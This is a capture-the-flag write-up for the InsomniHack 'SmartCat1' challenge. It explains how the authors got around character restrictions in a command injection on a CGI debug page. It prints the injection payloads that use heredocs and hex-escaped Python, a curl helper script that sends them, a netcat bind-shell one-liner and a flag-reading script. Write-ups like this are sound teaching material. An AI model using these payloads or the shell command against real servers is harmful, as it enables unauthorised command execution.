__InsomniHack CTF :: SmartCat1__
================


_Caleb Stewart_ | _Wednesday, December 30th, 2015_ 


> Almost there, but now you should be able to do better than a cat (sorry about the pun)
> I'm sure you can leverage the previous bug to get a shell
> Go on that [`debug interface`][smartcat] again and read the flag in /home/smartcat/


----------

![Smart Cat](../canihaz.jpg)

When we left off, we had very basic access to the server system. The problem with this piece was that we now need to pass parameters to commands on the server. We need to tell find where to search or at the very least change directories. Our initial idea was to write scripts with encoded characters to the temp directory, use python to decode the characters then execute those scripts. This is a very round about way to execute commands but it would be predictable. The only problem? We were unable to write to files on the disk. We wanted to use echo then redirect to a file, but we could pass parameters to echo due to our space restriction. Fast forward through an hour of failed attempts, we remembered the useful bash syntax off passing strings to standard input without echo:

``` bash
$ cat <<< "This goes to standard input"
```

Sadly, we only recieved a "failed to run command error," but this sparked another idea. We remembered bashes other syntax for standard input called [`Here Documents`][heredoc]. With heredocs, we are able to pass strings into other programs without spaces. Now, all we needed to do is craft a useful program without spaces, squigly braces, or parenthesis. This is much harder than it sounds. First, bash scripts require spaces. Next, python, php, perl and pretty much any other scripting language requires either spaces or parenthesis to delimit parameters to functions. We did realize that, in python, you could call print without a space or a parenthesis (I still don't understand why this syntax works). 

``` python
print'string to print'
```

This was great. We could now get a script running and write to the file system! We began implementing our idea from above. We first used pythong to take a script in plan text and convert it to a hex escaped string. It was a little excessive to escape every character, but it was quick and it worked:

``` python
script = 'find /home/smartcat'
print "".join('\\x' + c.encode('hex') for c in script)
```

This would give beautifully unreadable hex string. Next, we take this and wrap it in the little spaceless print command we used before, a heredoc, redirection to a temporary file, and a voila! We have a bash script in /tmp!

```
%0Apython<<EOF>/tmp/showmehome%0Aprint'\x6c\x73\x20\x2f\x68\x6f\x6d\x65\x2f\x73\x6d\x61\x72\x74\x63\x61\x74'%0AEOF
```

We had issues with filenames that had periods for some reason so we just avoided all extensions. Once we had the bash script, we could execute it the same way we executed python.

```
%0Abash</tmp/showmehome
```

This showed us what was in the home directory. Sadly, it wasn't as simply as last time...

```
flag2
readflag
```

We recieved errors when `cat`'ing flag2, and when attempting to run `readflag`. At this point, we whipped up a quick script to ease process of executing commands.

``` bash
#!/usr/bin/env bash

hexcommand=`python -c "print \"\".join(r'\\x'+char.encode('hex') for char in '$@')"`
python_script="print'$hexcommand'"
script_name="/tmp/25414552"
html_name=$RANDOM

curl --data "dest=%0Apython<<EOF>$script_name%0A$python_script%0AEOF" http://smartcat.insomnihack.ch/cgi-bin/index.cgi > /dev/null 2>&1
curl --data "dest=%0Abash<$script_name" http://smartcat.insomnihack.ch/cgi-bin/index.cgi > $html_name 2>/dev/null
xmllint --xpath "/html/body/pre" $html_name | sed "s/<pre>//g" | sed "s|</pre>||g"
rm $html_name
```

This is a really basic command which allows quick testing of commands and filesystem inspection. It also strips the HTML out of the response so it's nicer to work with. This script has some quirks here and there, but allowed us to see the permissions on the files. As we suspected, `flag2` was only readable by root, and its group (smartcat). The readflag executable was setgid for and owned by root:smartcat. Therefore, if we called readflag we should be able to see the contents of flag2.

We tried running readflag again with a bang (!) before it, in order to tell bash to ignore the result of the program. With that, we were able to see the output. This showed us a little message from the smartcat2 creators:

```
Almost there... just trying to make sure you can execute arbitrary commands....
Write 'Give me a...' on my stdin, wait 2 seconds, and then write '... flag!'.
Do not include the quotes. Each part is a different line.
```

We decided to attempt to get a real shell to aid in completing this challenge. We setup a netcat listener with a backpipe like so:

```
mknod /tmp/backpipe p;
bash 0</tmp/backpipe | nc -l 64512 1>/tmp/backpipe
```

For some reason, we could never connect. There may have been a firewall preventing our access, or our personal ISP was blocking our connection. Truly, we'll never know (quote, John Hammond). In the end, we took a step backwords, and crafted the following python script to call readflag for us.

``` python
#!/usr/bin/env python
​
import time, sys, subprocess
​
p = subprocess.Popen(('/home/smartcat/readflag', '/home/smartcat/flag2'), stdin=subprocess.PIPE, stdout=subprocess.PIPE)
​
p.stdin.write('Give me a...')
​
time.sleep(2)
​
p.stdin.write('... flag!')
​
p.wait()
​
print p.stdout.read()
```

We encoded it into hex, wrote it to /tmp/win, and finally executed it. It was able to run and give us the flag! The flag is not shown here, because the server was brought down after the competition due to excessive file creation and DOSing...

[smartcat]: http://smartcat.insomnihack.ch/cgi-bin/index.cgi
[heredoc]: https://en.wikipedia.org/wiki/Here_document